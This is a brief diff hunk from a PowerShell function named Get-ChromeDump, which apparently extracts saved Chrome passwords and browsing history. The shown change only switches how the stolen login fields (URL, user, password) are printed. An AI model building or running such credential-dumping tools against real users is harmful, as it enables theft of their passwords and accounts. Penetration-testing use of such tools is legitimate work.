@@ -192,7 +192,7 @@ Function Get-ChromeDump{
     
     if(!($OutFile)){
       "[*]CHROME PASSWORDS`n"
-      $logins | Format-Table ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME -Wrap | Out-String
+      $logins | Format-List ORIGIN_URL, ACTION_URL, PWD, USER, SCHEME | Out-String
 
       "[*]CHROME HISTORY`n"
 
